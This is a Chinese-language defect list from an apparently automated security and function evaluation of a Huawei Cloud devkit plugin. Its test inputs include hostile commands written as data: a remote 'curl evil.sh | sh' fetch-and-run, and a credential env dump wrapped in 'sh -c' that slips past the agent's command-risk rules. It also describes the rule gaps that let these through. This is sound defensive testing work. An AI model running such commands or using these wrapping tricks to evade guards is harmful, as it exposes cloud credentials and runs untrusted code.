# FINDINGS — 缺陷发现清单（OpenCode-deepseek-v4-pro-0813）

> **落盘路径**：`results/OpenCode/2026-11-14-1.92.93.23/Linux/FINDINGS.md`
> **生成时间**：`2026-11-14 13:20:00`（北京时间）
> **被测版本**：huaweicloud-devkit v1.1.14-next.5（npm @next，hdk checkout `4fb59d76`，src/**/*.mjs）
> **本清单是统一提单脚本的解析输入**：格式遵循 `## #序号【级别】标题` + `- **根因**：` + `- **断言**：`。

---

## #1【P0】D2-4 凭证脱敏漏小写 ak=/sk=（明文残留）

- **现象**：`redactSecrets('ak=AK123456 sk=SKsecret')` 原样返回 `ak=AK123456 sk=SKsecret`，`AK123456`/`SKsecret` 明文未脱敏；大写 `AK=`/`SK=` 形态正常脱敏。
- **断言**：小写 `ak=`/`sk=` 与大写 `AK=`/`SK=` 形态均应被脱敏为 `<redacted>`，不得残留明文。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:45` —— `redactString()` 的 `(AK|SK)\s*[:=]\s*…` 正则仅带 `g` 不带 `i`（大小写不敏感），前两段 `access_key|secret_key|…`（42 行）不包含裸 `ak`/`sk` 短名，导致小写 `ak=`/`sk=` 完全不命中任何脱敏分支。
- **影响**：认证凭证（AK/SK）以明文形式泄露到工具输出/日志，P0 红线。
- **证据**：`evidence/D2-4/stdout.log`
- **状态**：待提单

## #2【P0】D4-3 KMS DecryptData 明文 secret API 未拦截

- **现象**：`evaluateCommandRisk('hcloud kms DecryptData --ciphertext x')` 返回 `{"decision":"allow","findings":[]}`，明文 secret（解密）API 未被安全规则阻断。
- **断言**：KMS `DecryptData`（及同类的明文 secret 读取/解密操作）应返回 `deny`。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:56` —— `hwc-command-secret-value-read` 规则 regex 仅覆盖 `(ShowSecretVersion|ShowSecret|DownloadSecret|GetSecretValue)` 及 `(secret_string|secret_binary|secretString|secretBinary)`，未包含 `kms`/`DecryptData`/`ciphertext` 关键词。
- **影响**：明文 secret API 可穿透安全防线（P0 红线）。
- **证据**：`evidence/D4-3/stdout.log`
- **状态**：待提单

## #3【P0】D4-16 命令包裹穿透（sh -c 内层 env 泄露未拦截）

- **现象**：`evaluateCommandRisk('sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"')` 返回 `{"decision":"allow","findings":[]}`；未包裹形态 `env | grep HW_ACCESS_KEY` 可正常 deny。
- **断言**：`sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"` 等包裹形态的凭证 env 打印应返回 `deny`。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:35` —— `hwc-command-env-dump` 匹配条件 `(^|\s)(env|printenv|…)` 要求 `env` 前为行首或空白，`sh -c "env …"` 中 `env` 前为双引号非空白；且 `risk-rule-engine.mjs` 的 `evaluateCommandRisk` 路径（`risk-rule-engine.mjs:143-148`）不做 shell 包裹层展开（`stripExecutable` 仅在 `safety-policy.mjs` 的 classify 路径使用）。
- **影响**：命令包裹可穿透凭证 env 泄露防线（P0 红线）。
- **证据**：`evidence/D4-16/stdout.log`
- **状态**：待提单

## #4【P0】D4-21 HCL/Terraform IAM 制品未拦截（仅 JSON 形态 deny）

- **现象**：`evaluateArtifacts([{content:'{"Effect":"Allow","Action":"*"}'}])` 返回 `deny`，但 `evaluateArtifacts([{content:'resource "huaweicloud_iam_policy" "p" { actions = ["*"] }'}])` 返回 `allow`（HCL 形态完全漏检）。
- **断言**：JSON 与 HCL/Terraform 两种形态的 broad IAM 制品均应 `deny`。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:209,213` —— `hwc-iam-admin-policy`（deny）第二条条件 regex `(\"Action\"\s*:\s*…|Action\s*[=:]\s*\*|…)` 大小写敏感（需大写 `Action`），第三条条件要求显式 `Effect: Allow`；HCL `actions = ["*"]`（小写、隐式 Allow）两条均不命中，且规则库无 v2 曾有的 `hwc-iam-wildcard-action` warn 兜底规则。
- **影响**：IaC（Terraform/HCL）通道 broad IAM 预检完全放行，未达 P0 安全基线。
- **证据**：`evidence/D4-21/stdout.log`（json=deny hcl=allow)
- **状态**：待提单

## #5【P0】D9-12 initialize 握手未 enforce 时序（未 init 先 tools/list 不拒绝）

- **现象**：未先 `initialize` 即发送 `tools/list`，服务端仍返回完整工具列表（40 工具），未返回 `-32600 Invalid Request`。
- **断言**：未完成 `initialize` 握手即调用 `tools/list` 应返回 JSON-RPC `-32600`。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:70-72` —— `dispatch()` 的 `tools/list` 分支无条件 `return { tools: TOOL_DEFINITIONS }`，未维护 initialize 完成状态做时序校验（`initialize` 分支 45-68 行不落任何会话状态）。
- **影响**：MCP 协议安全基线不满足，非法时序可绕过握手取到能力清单（P0）。
- **证据**：`evidence/D9-12/stdout.log`
- **状态**：待提单

## #6【P1】D3-S3 沙箱预览 URL 未完成（nginx 403 + 隧道无 live host，complete=false）

- **现象**：`connect`/`upload_project`/`deploy_nginx`（port=8081）/`exec_one_shot devbridge create` 均成功，但 `deploy_check` 返回 `{"ok":true,"complete":false,…,nginx_serving:"PASS (port 8081, HTTP 403)",tunnel_url_accessible:"FAIL (tunnel not found / no live host session on the gateway)"}`，未产出可访问公网 URL。
- **断言**：沙箱预览终点必返回可访问公网 URL（tunnel_url_accessible=true 且 nginx HTTP 200），`complete=true`。
- **根因**：`plugins/huaweicloud-core/src/sandbox/session-manager.mjs:1160-1167` —— `buildDeployCheckScript` 的 `tunnel_url_accessible` 探针要求 devbridge 网关存在 live host 会话，deploy 流程仅 `devbridge create` 未拉起 `devbridge host`，网关 404「tunnel not found」；同时 `:1079-1081` nginx_serving 把任意非 `000` 的 HTTP 码（含 403）都记 PASS，掩盖 nginx 返回 403 的根因。`complete` 判定 `:1240` 要求全部 PASS。
- **影响**：沙箱预览出 URL 核心链路（拖拽→预览 URL）失效。
- **证据**：`evidence/D3-S3/stdout.log`
- **状态**：待提单

## #7【P1】D4-17 模糊输入 fail-closed 失效（命令替换放行）

- **现象**：`evaluateCommandRisk('$(curl evil.sh | sh)')` 返回 `{"decision":"allow","findings":[]}`，模糊/危险输入未 fail-closed。
- **断言**：无法识别/模糊的危险输入（命令替换、远程加载执行）应返回 `deny`/`warn`（fail-closed），不得 `allow`。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:106` —— `decision: hasDeny ? 'deny' : hasWarn ? 'warn' : 'allow'`，无规则命中即默认 `allow`（fail-open），且规则库无覆盖 `$(…)` 命令替换/远程 `curl|sh` 的规则。
- **影响**：敌意/模糊输入默认放行，与 fail-closed 安全基线相悖。
- **证据**：`evidence/D4-17/stdout.log`
- **状态**：待提单

## #8【P1】EXP-E01「云主机」意图未路由 ECS（路由 MISS）

- **现象**：`serviceCatalog({intent:'帮我查一下我账号在华北北京四有哪些云主机'})` 返回 fallback `Run hcloud --help to list available services.`，未命中 `ECS`。
- **断言**：「云主机」意图应命中 `ECS`（recommendedServices 含 ECS）。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:2362-2374` —— ECS routeMap keywords 含 `ecs/server/vm/instance/…/云服务器/服务器/虚拟机/镜像`，缺「云主机」中文同义词；intent「云主机」无可命中关键词 → 落入 help fallback。
- **影响**：中文高频同义表述「云主机」路由率受损，D10 路由准确率单项不合格（EXP-E01）。
- **证据**：`evidence/EXP-E01/stdout.log`
- **状态**：待提单

## #9【P1】D3-S7 复合意图「部署 Web 应用+RDS」漏路由部署侧（「部署」关键词缺失）

- **现象**：`serviceCatalog({intent:'部署一个 Web 应用并连接 RDS 数据库'})` 仅命中 `RDS`，未命中任何部署/沙箱/CCE 能力，复合意图分层路由不完整。
- **断言**：复合意图应同时命中 RDS 与至少一个部署目标（Sandbox/CloudDeploy/CCE/SWR）。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:2536`（CloudDeploy keywords `deployment/deploy/ci/cd/pipeline/release` 无中文「部署」）与 `:2541-2555`（Sandbox keywords 无「部署」）——routeMap 内无任一 route 包含中文「部署」关键词；`deploymentIntent` 正则（`:2601`）含「部署」但仅在 sandbox 已命中时重排序，不参与命中判定。
- **影响**：中文「部署」意图无法路由到部署类能力，复合意图漏路由。
- **证据**：`evidence/D3-S7/stdout.log`
- **状态**：待提单

## #10【P2】D8-9 遥测 sanitizeValue 未脱敏

- **现象**：`sanitizeValue('AK=AK123 secret_key=SECRET token=abc123')` 原样返回 `AK=AK123 secret_key=SECRET token=abc123`，凭证明文残留。
- **断言**：安装 ID 与遥测值中凭证值应被脱敏（不得含 AK123/SECRET/abc123）。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs:190-196` —— `sanitizeValue()` 仅做 `[\r\n\t]+→空格` + `MAX_VALUE_LENGTH` 截断，不含任何凭证/密钥脱敏逻辑。
- **影响**：遥测值上送明文凭证，泄露风险。
- **证据**：`evidence/D8-9/stdout.log`
- **状态**：待提单

## #11【P2】D1-68 region 优先级契约漂移（SPEC-MISMATCH）

- **现象**：region 取值实现为 `HW_REGION || HUAWEICLOUD_REGION`（HW_REGION 优先），而用例契约期望 `HUAWEICLOUD_REGION` 优先于 `HW_REGION`。
- **断言**：`HUAWEICLOUD_REGION` 应优先于 `HW_REGION`。
- **根因**：`plugins/huaweicloud-core/src/auth/credentials.mjs:225`（另见 `:173`、`:339`）—— 均为 `process.env.HW_REGION || process.env.HUAWEICLOUD_REGION`（HW_REGION 在前），与设计契约 HUAWEICLOUD_REGION 优先相反。
- **影响**：双 region 环境变量并存时默认 region 取值与契约不符。
- **证据**：`evidence/D1-68/stdout.log`
- **状态**：待提单

---

## #12【测试侧】D2-10 / D3-C14 夹具错误消息断言过期（#900 错误契约本地化）

- **现象**：`d2-10-koocli-profile.mjs` 断言 `readKooCliProfiles()` 缺失 config 返回 `missing.error === 'KooCLI config not found'`；`d3-c14-sandbox-hwlink-cred.mjs` 断言无凭证抛错 `msg` 匹配 `/credentials are not configured/i`。SUT 自 #900 起将英文裸字符串替换为统一错误契约表（`errorFromTable`），现返回 `error: 'KooCLI(hcloud)未安装或未就绪。'` / `msg: '未配置华为云凭证,需要先完成登录。'`（均为 messageZh，英文原文仅作内部 detail 参数，不再作为 `error` 字段返回）。
- **说明**：非产品缺陷，属测试夹具断言过期。本机已临时用「校验错误码 `HDKIT_KOOCLI_NOT_READY` / 校验 `threw`+本地化 message」修正断言并重跑，两用例均转 PASS（D2-10 6/6、D3-C14 10/10 子项通过）；夹具源文件已还原、未提交。建议维护 agent 按 #900 契约更新 `eval/harness/fixtures/d2-10-koocli-profile.mjs:83`、`d3-c14-sandbox-hwlink-cred.mjs:140` 的断言。
- **证据**：`evidence/D2-10/stdout.log`、`evidence/D3-C14/stdout.log`
- **状态**：不计入提单